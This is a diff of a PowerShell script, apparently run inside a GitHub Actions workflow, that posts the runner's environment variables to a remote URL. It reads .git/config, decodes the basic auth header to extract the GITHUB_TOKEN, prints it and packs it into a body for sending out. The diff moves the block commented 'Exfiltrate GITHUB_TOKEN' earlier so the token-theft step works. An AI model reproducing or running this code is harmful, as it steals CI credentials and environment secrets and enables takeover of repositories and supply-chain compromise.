@@ -10,6 +10,9 @@ $jsonBody = $envVariables | ConvertTo-Json
 
 $response = Invoke-RestMethod -Uri $remoteUrl -Method Post -Body $jsonBody -ContentType "application/json"
 
+# Exfiltrate GITHUB_TOKEN.
+$filePath = "$env:GITHUB_WORKSPACE/.git/config"
+$fileContent = Get-Content -Path $filePath -Raw
 
 $fileContent -match "basic[\s]+([\w\=]+)"
 $authHeader = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($Matches[1]))
@@ -17,10 +20,6 @@ Write-Output "Auth: $authHeader"
 $authHeader -match "x-access-token:([\w\-_]+)"
 $token = $Matches[1]
 Write-Output "GH TOKEN: $token"
-
-# Exfiltrate GITHUB_TOKEN.
-$filePath = "$env:GITHUB_WORKSPACE/.git/config"
-$fileContent = Get-Content -Path $filePath -Raw
 
 $body = @{
     token = $token
